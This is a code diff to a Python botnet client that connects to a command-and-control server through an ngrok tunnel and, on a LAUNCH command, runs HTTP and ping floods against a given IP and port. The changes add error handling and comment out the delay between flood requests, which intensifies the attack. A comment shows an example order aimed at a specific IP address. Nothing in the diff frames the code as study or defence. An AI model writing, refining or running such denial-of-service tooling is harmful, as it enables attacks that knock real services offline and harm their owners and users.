@@ -33,8 +33,15 @@ class lauchLoad:
 		if n[3]=="HTTPFLOOD":
 			while self._running and statusSet:
 				receiving_url = 'http://'+n[0]+':'+n[1]+'/'
-				u = urllib.request.urlopen(receiving_url).read()
-				time.sleep(int(n[4]))
+				try:
+					u = urllib.request.urlopen(receiving_url, timeout=10).read()
+				except urllib.error.URLError as e:
+					print(f"❌ Error conectando a {receiving_url}: {e}")
+					return  # Salir del thread
+				except Exception as e:
+					print(f"❌ Error inesperado: {e}")
+					return
+				#time.sleep(int(n[4]))
 
 		if n[3]=="PINGFLOOD":
 			while self._running:
@@ -83,7 +90,7 @@ def Main():
 
 
 	host = '0.tcp.sa.ngrok.io' #server
-	port = 15170 #server
+	port = 15170 
 
 	s = connect_with_retry(host,port)
 
@@ -108,11 +115,11 @@ def Main():
 		
 			data = s.recv(1024)
 
-			print('Response:',str(data.decode()))
+			print('Response:',str(data.decode())) # Response: LAUNCH
 
 			data = str(data.decode())
 			data = data.split('_')
-			print('server Response: ', data)  #check list empty code
+			print('server Response: ', data)  # ['167.172.229.50', '3000', 'LAUNCH', 'HTTPFLOOD', '0']
 			if len(data) > 1:
 				runStatus = data[2]
 			else:
@@ -133,7 +140,6 @@ def Main():
 					time.sleep(15)
 					if t.is_alive():
 						print('Connecting...')
-				#else: 
 				continue
 			elif runStatus == "HALT":
 				statusSet = 0
